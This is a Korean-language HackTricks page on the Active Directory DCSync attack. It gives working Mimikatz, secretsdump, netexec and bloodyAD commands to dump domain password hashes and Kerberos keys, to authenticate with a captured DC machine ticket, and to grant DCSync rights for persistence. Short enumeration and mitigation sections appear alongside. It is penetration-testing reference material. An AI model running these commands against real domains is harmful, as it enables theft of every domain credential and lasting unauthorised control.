# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

**DCSync** 권한이 있으면 도메인 자체에 대해 다음 권한을 보유한 것과 같습니다: **DS-Replication-Get-Changes**, **Replicating Directory Changes All**, **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>

**DCSync에 관한 중요 참고 사항:**

- **DCSync 공격은 도메인 컨트롤러의 동작을 시뮬레이션하고 Directory Replication Service Remote Protocol (MS-DRSR)을 사용해 다른 도메인 컨트롤러에 정보 복제를 요청합니다.** MS-DRSR은 Active Directory의 유효하고 필수적인 기능이므로 끄거나 비활성화할 수 없습니다.
- 기본적으로 **Domain Admins, Enterprise Admins, Administrators, Domain Controllers** 그룹만 필요한 권한을 보유합니다.
- 실제로 **전체 DCSync**를 수행하려면 도메인 명명 컨텍스트에 대해 **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** 권한이 필요합니다. `DS-Replication-Get-Changes-In-Filtered-Set`은 흔히 이 권한들과 함께 위임되지만, 단독으로는 전체 krbtgt 덤프보다는 **기밀 속성 / RODC 필터링 속성**(예: 레거시 LAPS 방식의 시크릿)을 동기화할 때 더 관련이 있습니다.<sup>[[2]](#references)</sup>
- 계정 암호가 가역 암호화 방식으로 저장된 경우, Mimikatz에서 암호를 평문으로 반환하는 옵션을 사용할 수 있습니다.

### 열거

`powerview`를 사용해 이러한 권한을 가진 사용자를 확인합니다:

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```

DCSync 권한이 있는 **비기본 보안 주체**에 집중하려면, 기본 제공 복제 가능 그룹을 필터링하고 예상치 못한 권한 주체만 검토하세요:

```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
  Where-Object {
    $_.ObjectType -match 'replication-get' -or
    $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
  } |
  Where-Object { $_.IdentityReference -notmatch $default } |
  Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```

### 로컬에서 Exploit하기

```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

### 원격으로 Exploit하기

```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```

실용적인 범위 지정 예시:<sup>[[1]](#references)</sup>

```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```

### 캡처한 DC 머신 TGT(ccache)를 사용한 DCSync

도메인 컨트롤러의 서비스를 검토할 때는 로컬 서비스 ID와 네트워크 ID를 구분하세요. [Microsoft 문서](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions)에 따르면 SQL Server 가상 계정(`NT SERVICE\...`)은 호스트 컴퓨터 계정으로 네트워크 리소스에 액세스합니다. 도메인 컨트롤러에서는 이 때문에 DC 머신 계정이 replication 권한 검토와 관련될 수 있지만, 서비스에 foothold를 확보했다고 해서 내보낼 수 있는 머신 TGT나 사용 가능한 DCSync 인증 수단이 확보된 것은 아닙니다. 이를 공격 경로로 간주하기 전에 실제 서비스 ID, 아웃바운드 인증 컨텍스트, 사용 가능한 티켓 또는 자격 증명, 유효한 replication 권한을 확인하세요.

unconstrained-delegation export-mode 시나리오에서는 Domain Controller 머신 TGT(예: `krbtgt@DOMAIN`용 `DC1$@DOMAIN`)를 캡처할 수 있습니다. 그러면 이 ccache를 사용해 비밀번호 없이 DC로 인증하고 DCSync를 수행할 수 있습니다.<sup>[[5]](#references)</sup>

```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

운영 참고 사항:

- **Impacket의 Kerberos 경로는 DRSUAPI 호출 전에 먼저 SMB에 접속합니다.** 환경에서 **SPN target name validation**을 적용하는 경우, 전체 덤프가 실패할 수 있습니다. `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- 이 경우, 먼저 대상 DC의 **`cifs/<dc>`** 서비스 티켓을 요청하거나, 당장 필요한 계정에 대해 **`-just-dc-user`**를 사용하세요.
- 복제 권한이 낮은 경우에도 LDAP/DirSync 방식의 동기화를 통해 전체 krbtgt 복제 없이 **confidential** 또는 **RODC-filtered** 속성(예: 레거시 `ms-Mcs-AdmPwd`)이 노출될 수 있습니다.<sup>[[2]](#references)</sup>

`-just-dc`는 파일 3개를 생성합니다.

- **NTLM hashes**가 포함된 파일
- **Kerberos keys**가 포함된 파일
- [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption)이 활성화된 계정의 NTDS에서 가져온 평문 비밀번호가 포함된 파일. reversible encryption이 활성화된 사용자를 찾으려면 다음을 실행합니다.

  ```bash
  Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
  ```

### 지속성

도메인 관리자라면 PowerView를 사용해 모든 사용자에게 이러한 권한을 부여할 수 있습니다:<sup>[[3]](#references)</sup>

```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```

Linux 운영자는 `bloodyAD`를 사용해 동일한 작업을 수행할 수 있습니다:

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```

그런 다음 (권한 이름은 "ObjectType" 필드에서 확인할 수 있습니다) 출력에서 3개의 권한이 사용자에게 올바르게 할당되었는지 **확인할 수 있습니다**:

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```

### 완화

- Security Event ID 4662 (개체에 대한 감사 정책을 활성화해야 함) – 개체에 대한 작업이 수행됨<sup>[[4]](#references)</sup>
- Security Event ID 5136 (개체에 대한 감사 정책을 활성화해야 함) – 디렉터리 서비스 개체가 수정됨
- Security Event ID 4670 (개체에 대한 감사 정책을 활성화해야 함) – 개체에 대한 권한이 변경됨
- AD ACL Scanner - ACL 보고서를 생성하고 비교합니다. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [1] [Impacket 변경 로그](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: Replication Get-Changes 및 Get-Changes-In-Filtered-Set 활용](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: Domain Controller에서 비밀번호 해시 덤프하기](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — SYSVOL 자격 증명 → Targeted Kerberoast → Unconstrained Delegation → DA로 DCSync](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
{{#include ../../banners/hacktricks-training.md}}
